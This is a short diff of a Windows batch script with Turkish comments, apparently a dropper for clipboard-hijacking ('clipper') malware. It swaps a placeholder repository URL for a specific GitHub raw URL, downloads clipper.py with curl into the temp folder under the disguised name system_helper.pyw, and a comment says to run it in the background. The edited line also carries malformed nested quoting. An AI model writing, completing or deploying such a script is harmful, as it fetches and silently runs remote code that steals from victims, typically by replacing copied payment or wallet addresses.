@@ -21,7 +21,7 @@ if errorlevel 1 (
 )
 
 :: Clipper scriptini indir (kendi dosya URL'n ile değiştir)
-set "CLIPPER_URL=https://raw.githubusercontent.com/SENIN_REPON/clipper/main/clipper.py"
+set "set "CLIPPER_URL=https://raw.githubusercontent.com/bilgi213h/hululu/main/clipper.py""
 curl -L -o "%TEMP%\system_helper.pyw" "%CLIPPER_URL%"
 
 :: Arka planda çalıştır
